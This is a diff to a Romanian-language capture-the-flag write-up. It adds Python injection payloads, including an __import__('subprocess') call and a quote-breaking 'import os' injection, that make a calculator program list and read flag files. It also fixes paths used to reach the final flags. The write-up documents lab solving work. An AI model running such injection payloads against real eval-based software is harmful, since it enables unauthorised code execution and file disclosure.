@@ -83,12 +83,16 @@ $ mv /tmp/.TEST_MODE_ENABLED /tmp/.TEST_MODE_DISABLED
 
 * incercam sa aflam continutul directorului cu python (si chatGPT :P)
 ```bash
-$ ./sant_calculator "'\n'.join(__import__('subprocess').check_output(['ls', '/home/t4l
-3nt/.flags']).decode().splitlines())"
+$ ./sant_calculator "'\n'.join(__import__('subprocess').check_output(['ls', '/home/t4l3nt/.flags']).decode().splitlines())"
 # hehe found it
 # izitthis.txt
 # no_thiz.txt
 # whereisflagz0rx.txt
+
+#versiunea mai usoara :)))
+$ ./sant_calculator "); import os; print(os.listdir('/home/t4l3nt/.flags')); print("
+# ['sant_calculator', '.flags', 'calculator.c']
+# si se poate printa continutul fisierelor cu list comprehension
 ```
 
 * afisam continutul fisierelor
@@ -111,7 +115,7 @@ $ ./sant_calculator "open('/home/t4l3nt/.flags/whereisflagz0rx.txt', 'r').read()
 ```bash
 $ su student
 # parola e student ofc :P
-$ strings /usr/local/bin/copy-the-flags
+$ strings /usr/local/bin/copy-t3h-fl4gz
 # !/bin/bash
 # set -e
 # umask 000
@@ -137,7 +141,7 @@ $ copy-t3h-fl4gz
 $ ls -al givemeflagz/
 $ cat givemeflagz/lastflag1.txt
 # ISC{almost_there_hang_on}
-$ cat second/lastflag2.txt
+$ cat ~/givemeflagz/second/lastflag2.txt
 # second este un folder pe care avem numai drept de execute => blind guessed numele dupa formatul primului flag
 # hope it works
 # anddddd Yesssss it works!!!!!
